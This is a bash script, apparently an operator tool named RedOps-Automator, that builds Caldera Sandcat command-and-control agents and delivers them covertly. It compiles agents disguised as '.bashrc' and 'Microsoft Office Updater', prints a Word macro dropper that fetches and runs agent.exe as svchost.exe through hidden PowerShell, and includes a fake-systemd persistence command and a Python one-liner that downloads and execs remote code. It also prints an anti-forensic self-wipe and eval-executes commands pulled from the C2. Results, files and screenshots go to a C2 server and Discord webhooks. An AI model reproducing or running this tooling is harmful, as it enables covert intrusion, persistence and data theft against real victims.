#!/bin/bash
# RedOps-Automator v3.0
# Full Caldera Agent Builder & Stealth Delivery Framework
# Author: Kdairatchi x GPT

function banner() {
    echo -e "${CYAN}"
    echo "██████╗ ███████╗██████╗ ██████╗ ██████╗ ██████╗ ███████╗"
    echo "██╔══██╗██╔════╝██╔══██╗██╔═══██╗██╔════╝ ██╔══██╗██╔════╝"
    echo "██████╔╝█████╗  ██████╔╝██║   ██║██║  ███╗██████╔╝███████╗"
    echo "██╔═══╝ ██╔══╝  ██╔═══╝ ██║   ██║██║   ██║██╔═══╝ ╚════██║"
    echo "██║     ███████╗██║     ╚██████╔╝╚██████╔╝██║     ███████║"
    echo "╚═╝     ╚══════╝╚═╝      ╚═════╝  ╚═════╝ ╚═╝     ╚══════╝"
    echo -e "${NC}"
}

# Global Variables
AGENT_DIR="$HOME/caldera/plugins/sandcat/gocat"
OUTPUT_DIR="$HOME/caldera/plugins/sandcat/payloads"
C2_HOST="http://127.0.0.1:8888"
CONTACTS=("http" "tcp" "udp" "websocket" "gist" "dns")
AGENT_PROFILE="$HOME/agent_profile.json"
WATCHDOG=0
CURRENT_DIR=$(pwd)

# Pre-check for Go and UPX
if ! command -v go &> /dev/null; then
    echo -e "${RED}[!] Go is not installed. Install Go and retry.${NC}"
    exit 1
fi

if ! command -v upx &> /dev/null; then
    echo -e "${YELLOW}[!] UPX not installed. Skipping packing.${NC}"
    PACKER=false
else
    PACKER=true
fi

function discord_alert() {
    local webhook_url="$1"
    local paw="$2"
    local platform="$3"
    local ip="$4"
    local executor="$5"
    local group="$6"
    local message="$7"
    local file_path="$8"

    if [ -n "$file_path" ] && [ -f "$file_path" ]; then
        # Send file (e.g., screenshot)
        resp=$(curl -s -F "payload_json={\"username\": \"RedOps Beacon\", \"content\": \"$message\"}" -F "file=@$file_path" "$webhook_url")
    else
        resp=$(curl -s -X POST "$webhook_url" \
            -H "Content-Type: application/json" \
            -d "{\"username\": \"RedOps Beacon\", \"content\": \"$message\"}")
    fi
    if ! echo "$resp" | grep -q 'id'; then
        echo -e "${RED}[!] Discord webhook failed. Response: $resp${NC}"
    fi
}

function discord_watchdog_timeout() {
    curl -s -X POST "$DISCORD_WEBHOOK" \
        -H "Content-Type: application/json" \
        -d "{\"username\": \"RedOps Beacon\", \"content\": \"❌ Agent failed watchdog check! Possible offline or killed.\"}"
}

function discord_payload_downloaded() {
    local filename="$1"
    curl -s -X POST "$DISCORD_WEBHOOK" \
        -H "Content-Type: application/json" \
        -d "{\"username\": \"Payload Dropper\", \"content\": \"📦 Agent downloaded payload: \`$filename\`\"}"
}

function discord_creds_alert() {
    local user="$1"
    local source="$2"
    curl -s -X POST "$DISCORD_WEBHOOK" \
        -H "Content-Type: application/json" \
        -d "{\"username\": \"RedOps Loot\", \"content\": \"🔐 Credentials found for user \`$user\` in \`$source\`\"}"
}

function discord_agent_summary() {
    local msg="""
**RedOps Agent Summary**  
| Field     | Value          |
|-----------|----------------|
| PAW       | $PAW           |
| Platform  | $platform      |
| Executor  | $executors     |
| IP        | $HOST_IP       |
| Group     | $group         |
"""
    curl -s -X POST "$DISCORD_WEBHOOK" -H "Content-Type: application/json" -d "{\"username\": \"Agent Report\", \"content\": \"$msg\"}"
}

function discord_self_destruct_notice() {
    local paw="$1"
    curl -s -X POST "$DISCORD_WEBHOOK" \
      -H "Content-Type: application/json" \
      -d "{\"username\": \"RedOps KillSwitch\", \"content\": \"💣 Agent \`$paw\` initiated self-destruct.\"}"
}

function discord_daily_summary() {
    local active_agents=$(cat logs/beacons.log | grep TODAY | wc -l)
    local payloads=$(ls payloads/ | wc -l)
    curl -s -X POST "$DISCORD_WEBHOOK" \
        -H "Content-Type: application/json" \
        -d "{\"username\": \"RedOps Daily\", \"content\": \"📊 **Daily Summary**\\nActive Agents: $active_agents\\nPayloads Deployed: $payloads\"}"
}

function create_agent_profile() {
    echo -e "${CYAN}[*] Creating agent profile...${NC}"
    read -p "C2 Server (default: $C2_HOST): " server
    server=${server:-$C2_HOST}
    read -p "Platform (windows/linux/darwin): " platform
    read -p "Host (hostname): " host
    read -p "Group (red/blue): " group
    read -p "Username: " username
    read -p "Architecture (amd64/x86): " architecture
    read -p "Executors (comma separated): " executors
    read -p "Privilege (User/Elevated): " privilege
    read -p "PID: " pid
    read -p "PPID: " ppid
    read -p "Location (path): " location
    read -p "Exe Name: " exe_name
    read -p "Host IP Addrs (comma separated): " host_ip_addrs
    read -p "Deadman Enabled (true/false): " deadman_enabled
    read -p "Upstream Dest: " upstream_dest
    read -p "Origin Link ID (for lateral movement): " origin_link_id
    read -p "Discord Webhook URL (or leave blank to skip alerts): " DISCORD_WEBHOOK

    cat <<EOF > $AGENT_PROFILE
{
  "server": "$server",
  "platform": "$platform",
  "host": "$host",
  "group": "$group",
  "username": "$username",
  "architecture": "$architecture",
  "executors": [$(echo $executors | sed 's/,/","/g;s/^/"/;s/$/"/')],
  "privilege": "$privilege",
  "pid": "$pid",
  "ppid": "$ppid",
  "location": "$location",
  "exe_name": "$exe_name",
  "host_ip_addrs": [$(echo $host_ip_addrs | sed 's/,/","/g;s/^/"/;s/$/"/')],
  "deadman_enabled": $deadman_enabled,
  "upstream_dest": "$upstream_dest",
  "origin_link_id": "$origin_link_id",
  "discord_webhook": "$DISCORD_WEBHOOK"
}
EOF
    echo -e "${GREEN}[+] Agent profile created: $AGENT_PROFILE${NC}"
}

function build_caldera_agents() {
    echo -e "${CYAN}[*] Building multi-platform Sandcat agents with OPSEC enhancements...${NC}"
    read -p "Enter Caldera C2 IP (default: 127.0.0.1): " c2_ip
    c2_ip=${c2_ip:-127.0.0.1}
    sed -i "s|server := \".*\"|server := \"http://$c2_ip:8888\"|" "$AGENT_DIR/sandcat.go"
    cd "$AGENT_DIR" || { echo "[!] Agent path not found"; return; }

    # Build Windows (GUI, UPX packed)
    GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H=windowsgui" -o "$OUTPUT_DIR/agent.exe" sandcat.go
    $PACKER && upx --best "$OUTPUT_DIR/agent.exe"
    # Build Linux (stripped, renamed)
    GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o "$OUTPUT_DIR/.bashrc" sandcat.go && strip --strip-all "$OUTPUT_DIR/.bashrc"
    # Build MacOS (spoofed binary)
    GOOS=darwin GOARCH=amd64 go build -ldflags="-s -w" -o "$OUTPUT_DIR/Microsoft Office Updater" sandcat.go
    echo -e "${GREEN}[+] Agents built and saved to: $OUTPUT_DIR${NC}"
    cd "$CURRENT_DIR"
    menu
}

function deliver_stealth_agent() {
    echo -e "${CYAN}[*] Choose delivery method:${NC}"
    echo "1. Windows Macro Dropper"
    echo "2. Linux Service Persistence"
    echo "3. Python Downloader (LOLBIN)"
    echo -n "Choice: "; read method

    case $method in
        1)
            echo "[+] VBA Macro Payload (embed in Word doc):"
            echo 'Sub AutoOpen()
Dim cmd As String
cmd = "powershell -w hidden -c ""(New-Object Net.WebClient).DownloadFile('""http://<IP>/agent.exe""','""%TEMP%\\svchost.exe""'); Start-Process '""%TEMP%\\svchost.exe""'"
Shell cmd, vbHide
End Sub'
            ;;
        2)
            echo "[+] Linux Persistence Command:"
            echo 'cp .bashrc /lib/systemd/systemd-networkd && chmod +x /lib/systemd/systemd-networkd && nohup /lib/systemd/systemd-networkd &'
            ;;
        3)
            echo "[+] Python Payload Example:"
            echo 'import urllib.request, base64; exec(base64.b64decode(urllib.request.urlopen("http://<IP>/payload.b64").read()))'
            ;;
        *) echo "[!] Invalid option.";;
    esac
    menu
}

function caldera_http_test_beacon() {
    echo -e "${CYAN}[*] Manual beacon test to Caldera${NC}"
    curl -X POST -H "Content-Type: application/json" -d '{"platform":"linux","executors":["bash"]}' "$C2_HOST/beacon"
    menu
}

function caldera_agent_config() {
    echo -e "${CYAN}[*] Example agent config in default.yml:${NC}"
    echo 'payloads:
  - name: stealth-agent
    platform: linux
    path: payloads/.bashrc'
    echo "\n[*] Example OPSEC config in agents.yml:"
    echo 'beacon:
  min: 300
  max: 600
  jitter: 0.25'
    menu
}

function self_destruct_agent() {
    echo -e "${RED}[*] Agent Self-Destruct Routine:${NC}"
    DISCORD_WEBHOOK=$(grep '"discord_webhook":' "$AGENT_PROFILE" | sed 's/.*: "\(.*\)".*/\1/')
    PAW=$(grep '"paw":' "$AGENT_PROFILE" | sed 's/.*: "\(.*\)".*/\1/')
    [ -n "$DISCORD_WEBHOOK" ] && discord_self_destruct_notice "$PAW"
    echo 'import os, sys, subprocess
os.remove(sys.argv[0])
subprocess.run(["history", "-c"])
with open(__file__, "w") as f: f.write("# wiped")'
    menu
}

function beacon_to_c2() {
    echo -e "${CYAN}[*] Beaconing to C2...${NC}"
    # Cross-platform base64 encoding (macOS, Linux, etc.)
    if base64 --help 2>&1 | grep -q "-w"; then
        profile=$(cat "$AGENT_PROFILE" | base64 -w 0)
    else
        profile=$(cat "$AGENT_PROFILE" | base64 | tr -d '\n')
    fi
    response=$(curl -s -X POST -d "$profile" "$C2_HOST/beacon" | base64 --decode)
    echo -e "${YELLOW}[*] Beacon response:${NC}\n$response"
    PAW=$(echo "$response" | grep -oP '"paw":\s*"\K[^"]+')
    SLEEP=$(echo "$response" | grep -oP '"sleep":\s*\K[0-9]+')
    WATCHDOG=$(echo "$response" | grep -oP '"watchdog":\s*\K[0-9]+')
    INSTRUCTIONS=$(echo "$response" | grep -oP '"instructions":\s*\[.*\]' | sed 's/\[\(.*\)\]/\1/')
    echo -e "${CYAN}[*] PAW: $PAW, Sleep: $SLEEP, Watchdog: $WATCHDOG${NC}"
    echo -e "${CYAN}[*] Instructions: $INSTRUCTIONS${NC}"
    # Discord webhook alert
    DISCORD_WEBHOOK=$(grep '"discord_webhook":' "$AGENT_PROFILE" | sed 's/.*: "\(.*\)".*/\1/')
    platform=$(grep '"platform":' "$AGENT_PROFILE" | sed 's/.*: "\(.*\)".*/\1/')
    group=$(grep '"group":' "$AGENT_PROFILE" | sed 's/.*: "\(.*\)".*/\1/')
    executors=$(grep '"executors":' "$AGENT_PROFILE" | sed 's/.*\[\(.*\)\].*/\1/' | tr -d '"')
    HOST_IP=$(echo "$response" | grep -oP '"host_ip_addrs":\s*\[\K[^\]]+' | sed 's/"//g' | cut -d, -f1)
    if [ -n "$DISCORD_WEBHOOK" ]; then
        discord_alert "$DISCORD_WEBHOOK" "$PAW" "$platform" "$HOST_IP" "$executors" "$group" "**🚨 Beacon Landed**\n> **PAW:** \`$PAW\`\n> **Platform:** \`$platform\`\n> **Group:** \`$group\`\n> **IP:** \`$HOST_IP\`\n> **Executors:** \`$executors\`"
    fi
}

function execute_instructions() {
    echo -e "${CYAN}[*] Executing instructions...${NC}"
    # Parse instructions from last beacon response
    if [ -z "$INSTRUCTIONS" ] || [ "$INSTRUCTIONS" == "" ]; then
        echo -e "${YELLOW}[!] No instructions to execute.${NC}"
        # Discord alert for no instructions
        DISCORD_WEBHOOK=$(grep '"discord_webhook":' "$AGENT_PROFILE" | sed 's/.*: "\(.*\)".*/\1/')
        PAW=$(grep '"paw":' "$AGENT_PROFILE" | sed 's/.*: "\(.*\)".*/\1/')
        [ -n "$DISCORD_WEBHOOK" ] && discord_alert "$DISCORD_WEBHOOK" "$PAW" "" "" "" "" "⚠️ No instructions to execute for PAW $PAW"
        return
    fi
    instructions_json="[$INSTRUCTIONS]"
    echo "$instructions_json" > /tmp/instructions.json
    if ! command -v jq &>/dev/null; then
        echo -e "${RED}[!] jq is required for instruction parsing. Install with: sudo apt install jq${NC}"
        return
    fi
    num=$(jq length /tmp/instructions.json)
    for ((i=0; i<num; i++)); do
        instr=$(jq .[$i] /tmp/instructions.json)
        id=$(echo "$instr" | jq -r .id)
        sleep_time=$(echo "$instr" | jq -r .sleep)
        cmd_b64=$(echo "$instr" | jq -r .command)
        executor=$(echo "$instr" | jq -r .executor)
        timeout=$(echo "$instr" | jq -r .timeout)
        payload=$(echo "$instr" | jq -r .payload)
        uploads=$(echo "$instr" | jq -r .uploads[] 2>/dev/null)
        cmd=$(echo "$cmd_b64" | base64 --decode)
        echo -e "${CYAN}[*] Instruction $id: executor=$executor, sleep=$sleep_time, timeout=$timeout${NC}"
        echo -e "${CYAN}[*] Command: $cmd${NC}"
        # Discord log for instruction
        DISCORD_WEBHOOK=$(grep '"discord_webhook":' "$AGENT_PROFILE" | sed 's/.*: "\(.*\)".*/\1/')
        PAW=$(grep '"paw":' "$AGENT_PROFILE" | sed 's/.*: "\(.*\)".*/\1/')
        [ -n "$DISCORD_WEBHOOK" ] && discord_alert "$DISCORD_WEBHOOK" "$PAW" "" "" "" "" "**Instruction $id**\nExecutor: $executor\nTimeout: $timeout\nCommand: $cmd"
        # Download payload if needed
        if [ "$payload" != "null" ] && [ "$payload" != "" ]; then
            echo -e "${YELLOW}[*] Downloading payload: $payload${NC}"
            curl -X POST -H "file:$payload" $C2_HOST/file/download > "$payload"
            [ -n "$DISCORD_WEBHOOK" ] && discord_alert "$DISCORD_WEBHOOK" "$PAW" "" "" "" "" "📦 Agent $PAW dropped payload $payload"
        fi
        output=""
        stderr=""
        exit_code=0
        status=0
        pid=0
        if [ "$executor" == "bash" ] || [ "$executor" == "sh" ]; then
            output=$(eval "$cmd" 2> >(stderr=$(cat); typeset -p stderr))
            exit_code=$?
        else
            output="[Executor $executor not supported in script]"
            status=1
        fi
        # Screenshot sending (aquatone/gowitness)
        for screenshot in $(ls *.png 2>/dev/null); do
            [ -n "$DISCORD_WEBHOOK" ] && discord_alert "$DISCORD_WEBHOOK" "$PAW" "" "" "" "" "🖼 Screenshot from $PAW" "$screenshot"
        done
        # Upload files if needed
        for upload in $uploads; do
            if [ -f "$upload" ]; then
                echo -e "${YELLOW}[*] Uploading file: $upload${NC}"
                curl -X POST -F "file=@$upload" $C2_HOST/file/upload
                [ -n "$DISCORD_WEBHOOK" ] && discord_alert "$DISCORD_WEBHOOK" "$PAW" "" "" "" "" "📤 Agent $PAW uploaded file $upload"
            fi
        done
        # Prepare result JSON
        result_json="{\"paw\":\"$PAW\",\"results\":[{\"id\":\"$id\",\"output\":\"$(echo "$output" | base64 | tr -d '\n')\",\"stderr\":\"$(echo "$stderr" | base64 | tr -d '\n')\",\"exit_code\":$exit_code,\"status\":$status,\"pid\":$pid}]}"
        result_b64=$(echo "$result_json" | base64 | tr -d '\n')
        curl -s -X POST -d "$result_b64" "$C2_HOST/beacon"
        # Forward output to Discord
        [ -n "$DISCORD_WEBHOOK" ] && discord_alert "$DISCORD_WEBHOOK" "$PAW" "" "" "" "" "**Output for Instruction $id**\nExit Code: $exit_code\nOutput: $output\nStderr: $stderr"
        echo -e "${CYAN}[*] Sleeping $sleep_time seconds before next instruction...${NC}"
        sleep $sleep_time
    done
    echo -e "${GREEN}[+] All instructions executed.${NC}"
}

function download_payload() {
    echo -e "${CYAN}[*] Downloading payload...${NC}"
    read -p "Payload filename: " payload
    curl -X POST -H "file:$payload" $C2_HOST/file/download > $payload
    echo -e "${GREEN}[+] Payload downloaded: $payload${NC}"
    DISCORD_WEBHOOK=$(grep '"discord_webhook":' "$AGENT_PROFILE" | sed 's/.*: "\(.*\)".*/\1/')
    [ -n "$DISCORD_WEBHOOK" ] && discord_payload_downloaded "$payload"
}

function upload_file() {
    echo -e "${CYAN}[*] Uploading file to C2...${NC}"
    read -p "File to upload: " file
    curl -X POST -F "file=@$file" $C2_HOST/file/upload
    echo -e "${GREEN}[+] File uploaded: $file${NC}"
}

function watchdog_check() {
    echo -e "${CYAN}[*] Watchdog check...${NC}"
    if [ "$WATCHDOG" -gt 0 ]; then
        echo -e "${YELLOW}[*] Watchdog enabled: $WATCHDOG seconds${NC}"
    else
        echo -e "${YELLOW}[*] Watchdog disabled (0 = infinite)${NC}"
    fi
    # Discord alert for watchdog
    DISCORD_WEBHOOK=$(grep '"discord_webhook":' "$AGENT_PROFILE" | sed 's/.*: "\(.*\)".*/\1/')
    PAW=$(grep '"paw":' "$AGENT_PROFILE" | sed 's/.*: "\(.*\)".*/\1/')
    if [ -n "$DISCORD_WEBHOOK" ]; then
        if [ "$WATCHDOG" -gt 0 ]; then
            discord_alert "$DISCORD_WEBHOOK" "$PAW" "" "" "" "" "🟡 Watchdog enabled for $PAW: $WATCHDOG seconds"
        else
            discord_alert "$DISCORD_WEBHOOK" "$PAW" "" "" "" "" "🔵 Watchdog disabled for $PAW"
        fi
    fi
}

function build_sandcat_agent() {
    echo -e "${CYAN}[*] Building Sandcat agent for all platforms...${NC}"
    read -p "Caldera Server IP (default: 127.0.0.1): " c2_ip
    c2_ip=${c2_ip:-127.0.0.1}
    sed -i "s|server := \".*\"|server := \"http://$c2_ip:8888\"|" "$AGENT_DIR/sandcat.go"
    cd "$AGENT_DIR" || { echo "[!] Agent path not found"; return; }
    GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H=windowsgui" -o "$OUTPUT_DIR/agent.exe" sandcat.go
    $PACKER && upx --best "$OUTPUT_DIR/agent.exe"
    GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o "$OUTPUT_DIR/.bashrc" sandcat.go && strip --strip-all "$OUTPUT_DIR/.bashrc"
    GOOS=darwin GOARCH=amd64 go build -ldflags="-s -w" -o "$OUTPUT_DIR/Microsoft Office Updater" sandcat.go
    echo -e "${GREEN}[+] Agents built and saved to: $OUTPUT_DIR${NC}"
    cd "$CURRENT_DIR"
}

function beacon_loop() {
    echo -e "${CYAN}[*] Starting live beacon loop...${NC}"
    while true; do
        beacon_to_c2
        if [ -z "$SLEEP" ] || [ "$SLEEP" == "" ]; then
            SLEEP=10
        fi
        echo -e "${YELLOW}[*] Sleeping for $SLEEP seconds...${NC}"
        sleep $SLEEP
    done
}

function menu() {
    echo -e "${BLUE}\nCaldera Agent Ultimate Menu${NC}"
    echo -e "${CYAN}1. Create Agent Profile"
    echo -e "2. Beacon to C2"
    echo -e "3. Execute Instructions"
    echo -e "4. Download Payload"
    echo -e "5. Upload File"
    echo -e "6. Watchdog Check"
    echo -e "7. Build Sandcat Agent"
    echo -e "8. Live Beacon Loop"
    echo -e "0. Exit${NC}"
    echo -n "Choice: "; read choice
    case $choice in
        1) create_agent_profile ;;
        2) beacon_to_c2 ;;
        3) execute_instructions ;;
        4) download_payload ;;
        5) upload_file ;;
        6) watchdog_check ;;
        7) build_sandcat_agent ;;
        8) beacon_loop ;;
        0) echo "Bye."; exit ;;
        *) echo "Invalid option"; menu ;;
    esac
}

banner
menu


